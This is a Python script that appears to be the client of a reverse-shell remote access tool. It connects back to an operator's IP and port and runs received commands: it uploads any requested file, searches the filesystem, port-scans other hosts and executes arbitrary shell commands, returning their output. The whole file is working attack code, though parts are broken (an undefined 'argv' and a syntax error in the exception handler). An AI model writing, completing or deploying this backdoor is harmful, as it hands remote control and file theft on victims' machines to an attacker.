#!/usr/bin/env python3
import socket 
import subprocess
import os
import re

def transfer(s,path):
    if os.path.exists(path):
        f=open(path,'rb')
        packet=f.read(1024)
        while len(packet)>0:
            s.send(packet)
            packet=f.read(1024)
        s.send('DONE'.encode())
    else:
        s.send('File not found'.encode())

def scanner(s,ip,ports):
    scan_res=''
    for port in ports.split(","):
        try:
            sock=socket.socket()
            out=sock.connect_ex((ip,int(port)))
            if out==0:
                scan_res=scan_res+"[+] Port "+port+" is open\n"
        except Exception as err:
            pass
    s.send(scan_res.encode())
        
def connect(ip,port):
    s=socket.socket()
    s.connect((ip,port))
    while True:
        command=s.recv(1024)
        if 'terminate'  in command.decode():
            s.close()
            break
        elif 'grab' in command.decode():
            grab,path=command.decode().split(" ")
            try:
                transfer(s,path)
            except:
                print("Error in passing file")
        elif 'cd' in command.decode():
            code,directory=command.decode().split(" ")
            try:
                os.chdir(directory)
                s.send("[+]changed".encode())
            except Exception as e:
                s.send(("[-]"+str(e)).encode())
                
        elif 'search' in command.decode():
            command=command[7:]
            path,name=command.decode().split(" ")
            lists=''
            for dirpath,dirname,files in os.walk(path):
                for file in files:
                    if re.findall(name,file):
                        lists=lists+'\n'+os.path.join(dirpath,file)
            s.send(str(lists).encode())

        elif 'scan' in command.decode():
            command=command[5:]
            ip,port=command.decode().split(":")
            scanner(s,ip,port)
            
        else:
            cmd=subprocess.Popen(command.decode(),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            s.send(cmd.stdout.read())
            s.send(cmd.stderr.read())
        
def main():
    try:
        connect(str(argv[1]),int(argv[2]))
    except IndexError: as e:
        print("usage ./client.py <target ip addr> <port>\n")
    except Exception as e:
    	print(str(e))
    
main()
            
